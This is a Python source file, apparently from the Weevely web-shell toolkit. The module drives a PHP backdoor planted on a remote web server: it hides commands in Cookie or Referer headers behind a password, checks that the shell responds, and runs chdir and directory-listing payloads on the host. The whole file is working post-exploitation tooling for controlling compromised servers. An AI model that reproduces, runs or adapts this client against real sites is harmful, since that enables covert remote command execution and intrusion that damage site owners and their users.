'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
import random, os

classname = 'Php'
    
class Php(Module):
    '''Shell to execute PHP commands
    :shell.php "<command>;"
    '''
    
    available_modes = [ 'Cookie', 'Referer' ]
    
    def __init__(self, modhandler, url, password):
        
        self.cwd_vector = None
        self.path = None
        self.proxy = None
        
        self.current_mode = None
                    
        mode = modhandler.conf.get_option('global', 'request_mode')
        if mode in self.available_modes:
            self.modes = [ mode ]
        else:
            self.modes = self.available_modes
        
        
        Module.__init__(self, modhandler, url, password)
        
        proxy = modhandler.conf.get_option('global', 'http_proxy')
        if proxy:
            self.mprint('[shell.php] Proxy cache can broke weevely requests, use proxychains instead.')
            self.proxy = { 'http' : proxy }

        self.mprint('[shell.php] Loaded using \'%s\' encapsulation' % self.current_mode)
        

    def _probe(self):
        
        found = False
        for currentmode in self.modes:
            
            rand = str(random.randint( 11111, 99999 ))
            self.current_mode = currentmode
            
            if self.run('echo %s;' % (rand)) == rand:
                found = True
                break
        
        if not found:
            raise ModuleException(self.name,  "PHP interpreter initialization failed")
        else:
            if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
                self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
            else:
                self.cwd_vector = "chdir('%s') && %s" 
                
       
    def run(self, cmd, use_current_path = True, post_data = {}):

        if use_current_path and self.cwd_vector and self.path:
            cmd = self.cwd_vector % (self.path, cmd)
        
        request = CmdRequest( self.url, self.password, self.proxy)
        request.setPayload(cmd, self.current_mode)
        if post_data:
            request.setPostData(post_data)
        
        debug_level = 5
        
        self.mprint( "Request: %s" % (cmd), debug_level)
        
        try:
            resp = request.execute()
        except NoDataException, e:
            self.mprint( "Response: NoData", debug_level)
            pass
        except Exception, e:
            self.mprint('[!] Error requesting data: check URL or your internet connection.')
        else:
                    
            if  'error' in resp and 'eval()\'d code' in resp:
                self.mprint('[!] Invalid response \'%s\', skipping' % (cmd), debug_level)
            else:
                self.mprint( "Response: %s" % resp, debug_level)
                return resp
        

    def cwd_handler (self, path):
        
        response = self.run("is_dir('%s') && print(1);" % path, False)
        if response == '1':
            self.path = path
            return True
        return False
    
    def ls_handler (self, cmd):
        
        cmd_splitted = cmd.split()
        
        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
        
        if len(cmd_splitted)==2:
            path = cmd_splitted[1]
        elif self.path:
            path = self.path
        else:
            path = '.'
            
            
        response = self.run( ls_vector % (path), False)
        if not response:
            self.mprint('[!] Error listing files in \'%s\', incorrect permission or safe mode enabled' % path)
            
        return response
            
    
    